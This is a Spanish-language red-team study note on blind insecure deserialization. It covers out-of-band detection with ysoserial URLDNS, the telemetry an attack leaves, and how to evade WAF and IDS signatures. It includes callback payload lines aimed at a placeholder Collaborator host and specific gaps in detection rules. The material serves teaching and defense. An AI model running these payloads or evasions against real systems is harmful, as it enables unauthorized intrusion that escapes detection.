---
tags:
  - Web/Red-Team
  - Deserializacion
  - Tipo/Deteccion
Descripción: "Cómo detectar un sink de deserialización ciego, qué telemetría deja el ataque y cómo se evaden los WAF que buscan firmas de datos serializados"
Fecha de actualización: 2026-11-20
Nota previa: "[[11 - Más allá de pickle - JSONPickle, PyYAML y ruamel]]"
Nota siguiente: "[[13 - Defensa - formatos seguros y restricción de clases]]"
Area: "[[Deserialización.base|Deserialización]]"
---
---

El lab deserializa en la misma petición y devuelve el resultado al instante. En producción, el `sink` suele estar detrás de un WAF, el resultado no vuelve (deserialización **ciega**), y cada intento queda registrado. Esta nota cubre las tres caras del problema real: detectar un `sink` que no responde, saber qué rastro deja el ataque, y evadir el filtrado perimetral.

# Detectar deserialización ciega

Muchas deserializaciones ocurren fuera del ciclo petición-respuesta: un `job` en una cola, un `pickle` de caché que se lee en segundo plano, un objeto de sesión que se procesa asíncronamente. El `payload` se acepta pero no hay salida que confirme ejecución. La detección se apoya en **efectos de canal lateral**:

| Técnica | Cómo confirma |
| --- | --- |
| **Interacción OOB (DNS/HTTP)** | El `payload` fuerza una resolución DNS o una petición HTTP a un dominio del atacante. Si llega la petición, el `sink` ejecutó |
| **Java `URLDNS`** | Cadena de `ysoserial` que no da RCE pero fuerza un lookup DNS. Prueba la deserialización sin depender de `gadgets` de ejecución |
| **`JRMPClient` / `JRMPListener`** | Confirma deserialización Java y abre la puerta a cadenas si hay `gadgets` |
| **GadgetProbe** | Enumera qué clases/bibliotecas hay en el `classpath` Java sondeando con DNS, antes de elegir la cadena |
| **Timing** | Un `sleep` en el `payload` que retrasa la respuesta de forma medible |

<mark style="background: #ADCCFFA6;">La interacción fuera de banda es la herramienta central de la deserialización ciega</mark>: en PHP un `gadget` que haga una petición HTTP al Collaborator, en Python un `os.system("curl http://<collab>")` o un `__reduce__` con `urllib`, en Java la cadena `URLDNS`. Burp Collaborator (o un `interactsh` autohospedado) es el receptor estándar.

> [!important]+ URLDNS: el canario de Java
> `java -jar ysoserial.jar URLDNS "http://<id>.oastify.com"` genera un objeto serializado que, al deserializarse, resuelve ese dominio **sin requerir ninguna biblioteca de `gadgets` en el `classpath`**. Es la prueba de deserialización más fiable en Java: si el DNS lookup llega, el `readObject` es alcanzable y controlado, aunque todavía no haya camino a RCE. Es el primer disparo contra cualquier `sink` Java sospechoso.

# Qué telemetría deja el ataque

Saber qué registra el objetivo sirve para dos cosas: anticipar la detección (Red Team) y diseñarla mejor (el lado defensivo, en [[13 - Defensa - formatos seguros y restricción de clases]]). El ataque de deserialización deja rastro en:

- **Logs de aplicación**: el `payload` que da `500` genera una excepción con traza. Un `TypeError: __reduce__` de Python o un `unserialize(): Error at offset` de PHP en los logs es la firma inequívoca de un intento. <mark style="background: #FFB86CA6;">El `500` que el atacante celebra como «el comando corrió igual» es exactamente lo que el defensor ve como alerta</mark>.
- **Telemetría de procesos (EDR)**: una RCE lanza un proceso hijo desde el intérprete web. `php-fpm` o `python` como padre de `sh`/`nc`/`curl` es un patrón que cualquier EDR marca. Las cadenas `File write` de PHPGGC existen precisamente para evitar este patrón escribiendo una webshell en vez de ejecutar un proceso.
- **WAF/IDS**: la firma de los datos serializados en el cuerpo de la petición (ver abajo).
- **FIM**: una webshell escrita en el `webroot` dispara monitorización de integridad de ficheros.

# Evadir el WAF

Un WAF razonable busca las firmas de datos serializados de [[02 - Identificar datos serializados y sus sinks]] en parámetros y cuerpo: prefijos `O:`/`a:` de PHP, `rO0AB` de Java, `AAEAAAD/////` de .NET, `gASV` / `\x80\x04` de pickle. Las vías de evasión:

| Vía | Mecanismo |
| --- | --- |
| **Codificación** | El `payload` va en Base64 dentro de un parámetro; el WAF ve Base64 opaco, no la firma. Doble codificación si el WAF decodifica una capa |
| **Compresión** | `gzip`/`zlib` del blob serializado antes de codificar: cambia por completo los bytes de firma |
| **Ubicación** | Meter el `payload` donde el WAF no inspecciona a fondo: una cookie, una cabecera custom, un campo profundo de un JSON/multipart |
| **Fragmentación** | `chunked transfer-encoding`, `multipart` con el blob partido |
| **Protocolo mínimo pickle** | Elegir el protocolo de `pickle` cuyos bytes de firma no coincidan con la regla del WAF |

<mark style="background: #8000E1A6;">La observación de fondo: la firma solo es visible si el WAF ve los bytes serializados en claro</mark>. Como la aplicación ya espera el dato codificado (Base64 en una cookie, por ejemplo), el atacante entrega el `payload` en la misma codificación que la app acepta, y el WAF nunca ve la firma a menos que decodifique cada capa — lo que casi ningún WAF hace en profundidad por coste.

Para el bypass de la lógica interna (no del WAF sino de un filtro de la propia aplicación, como la blacklist de `HTBooks`), las técnicas son las de [[10 - Bypass de filtros en deserialización Python]]: `quoting` de shell, callables alternativos, `opcodes` ofuscados.

> [!warning]+ El WAF no es la defensa real
> Evadir el WAF es táctica, no la raíz. Un WAF que bloquea firmas de serialización reduce el ruido de escaneo automático pero no cierra el `sink`: siempre hay una codificación o una ubicación que no inspecciona. Por eso, del lado defensivo, un WAF ante deserialización es mitigación compensatoria, nunca el control primario — el control es no deserializar entrada no confiable, en [[13 - Defensa - formatos seguros y restricción de clases]].

# Qué reglas existen de verdad (y cuáles no)

Para calibrar la evasión conviene saber qué busca el defensor realmente, no en abstracto:

- **OWASP CRS** (el ruleset de ModSecurity) cubre bien PHP y Java: la regla **`933170`** («Serialized Object Injection») matchea el patrón `[oOcC]:\d+:"...":\d+:{` en cookies, cabeceras y argumentos; <mark style="background: #FFB8EBA6;">pero su regex exige `":` tras el nombre de clase, así que un **array puro** (`a:1:{...}`) **no** la dispara</mark>, y hay cadenas que funcionan solo con arrays. Para Java, **`944200`/`944210`** cazan los magic bytes `\xac\xed\x00\x05` y sus tres variantes Base64 (`rO0ABQ`, `KztAAU`, `Cs7QAF`). Para Node, **`934100`**.
- **Emerging Threats / Suricata** trae decenas de reglas para Java (`ysoserial` en la URI, cadenas Commons-Collections, Spring, Groovy). <mark style="background: #FF5582A6;">Para Python/`pickle` el ruleset abierto no tiene **ninguna** regla</mark>, y las cuatro reglas de PHP serialize (`2062295-98`) vienen **comentadas/desactivadas** por coste y se evaden mandando un `Referer`.
- **Sigma** no cubre la deserialización como clase: cero reglas de `pickle`, `ysoserial` o `viewstate` en el repo oficial. La detección basada en host hay que construirla a mano (log del filtro de Java, audit hooks de Python — ver [[13 - Defensa - formatos seguros y restricción de clases]]).

<mark style="background: #8000E1A6;">La conclusión práctica: la cobertura pública está muy sesgada a Java y PHP sobre el tráfico, y es casi inexistente para Python</mark>. Y como ninguna regla descomprime, comprimir el `payload` antes de codificarlo evade todas las firmas documentadas.

# Herramientas de detección en el tráfico

- **Freddy** (Burp BApp): detecta y ayuda a explotar serialización Java/.NET pasivamente sobre el tráfico; marca los parámetros que llevan datos serializados.
- **GadgetProbe** (extensión de Burp): sondea el `classpath` Java vía DNS.
- **`ysoserial` / `ysoserial.net`**: generación de `payloads` y `URLDNS` para detección ciega.
- **`pickletools.dis`**: inspección de cualquier `pickle` capturado antes de concluir qué hace.

Estado de mantenimiento y comandos de cada una, en [[14 - Arsenal de herramientas de deserialización]].

> [!info]+ Fuentes
> Detección ciega con interacción OOB y `URLDNS`: [PortSwigger Web Security Academy — Insecure deserialization](https://portswigger.net/web-security/deserialization) y el repo [ysoserial](https://github.com/frohoff/ysoserial). Patrones de telemetría de procesos: [MITRE ATT&CK T1059 — Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/). Firmas de serialización para WAF/IDS verificadas contra la tabla de [[02 - Identificar datos serializados y sus sinks]].
